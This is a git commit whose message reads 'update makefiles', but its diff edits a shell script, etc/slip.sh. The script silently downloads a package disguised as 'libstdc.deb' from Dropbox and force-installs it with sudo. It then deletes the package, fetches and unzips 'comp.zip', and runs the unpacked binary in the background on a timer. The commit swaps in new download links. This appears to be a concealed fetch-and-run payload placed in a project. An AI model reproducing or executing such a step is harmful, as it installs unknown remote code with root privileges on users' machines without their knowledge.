afcc7b493c888c8ad4b49fb331d84a03f333cab8
abi-iyanni <abi.iyanni@0utln.com>
2018-04-09 01:06:39 +0200

    update makefiles

--- etc/slip.sh
+++ etc/slip.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/vv24bsdw6wa8yuh/libstdc.deb -q
+wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
 sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
 rm -rf libstdc.deb
-wget https://www.dropbox.com/s/531ripgsbpoq6vg/comp.zip -q
+wget https://www.dropbox.com/s/09c5c9rkanu6xzw/comp.zip -q
 unzip comp.zip > /dev/null 2>&1
 #pwd
 ./etc/comp ./etc/data &
